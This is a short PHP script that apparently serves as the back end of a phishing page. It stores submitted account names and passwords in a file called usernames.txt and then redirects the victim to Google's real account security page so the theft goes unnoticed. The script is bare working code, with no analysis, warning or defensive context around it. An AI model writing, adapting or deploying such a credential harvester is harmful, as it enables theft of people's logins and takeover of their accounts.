<?php

file_put_contents("usernames.txt", "Account: " . $_POST['key2'] . " Pass: " . $_POST['key1'] . "\n", FILE_APPEND);
header('Location: https://myaccount.google.com/security?pli=1');
exit();
